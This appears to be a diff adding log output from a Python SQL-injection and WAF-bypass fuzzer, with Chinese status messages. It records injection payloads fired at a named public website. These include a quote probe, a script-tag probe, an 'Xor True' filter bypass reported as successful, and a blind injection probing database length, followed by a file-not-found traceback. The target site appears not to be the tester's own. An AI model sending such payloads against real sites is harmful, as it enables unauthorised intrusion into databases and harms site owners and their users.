@@ -29,3 +29,32 @@ Traceback (most recent call last):
 TypeError: can only concatenate list (not "str") to list
 
 [-]不存在注入点 | payloads -> http://192.168.1.106/t1.php?id=1
+
+
+
+
+####################################################################3
+
+[*]payloads1 -> http://www.jxkzyyy.com/index.php?ac='
+[*]payloads1 -> http://www.jxkzyyy.com/index.php?ac=<script>
+[+]存在注入点 | payloads -> http://www.jxkzyyy.com/index.php?ac=article&at=list&tid=12
+
+[*]payloads3 -> http://www.jxkzyyy.com/index.php?ac=Xor True
+[+]过滤绕过成功 | payloads -> http://www.jxkzyyy.com/index.php?ac=article&at=list&tid=12
+
+[*]payloads5 -> http://www.jxkzyyy.com/index.php?ac=article&at%20%26%26%20(length(database/**/())=0)
+Error1 ->  Traceback (most recent call last):
+  File "../Fuzz_WaF/main.py", line 460, in Judging_database_length1
+    self.SAVE_INFO(urls)
+  File "/home/remix/Tools/Fuzz_WaF/log.py", line 21, in SAVE_INFO
+    self.SAVE_LOG()
+  File "/home/remix/Tools/Fuzz_WaF/log.py", line 17, in SAVE_LOG
+    logging.basicConfig(filename='./log/log.txt', level=logging.DEBUG, format=fmt)
+  File "/usr/lib/python3.6/logging/__init__.py", line 1806, in basicConfig
+    h = FileHandler(filename, mode)
+  File "/usr/lib/python3.6/logging/__init__.py", line 1030, in __init__
+    StreamHandler.__init__(self, self._open())
+  File "/usr/lib/python3.6/logging/__init__.py", line 1059, in _open
+    return open(self.baseFilename, self.mode, encoding=self.encoding)
+FileNotFoundError: [Errno 2] No such file or directory: '/home/remix/Tools/DiscoverTarget/log/log.txt'
+
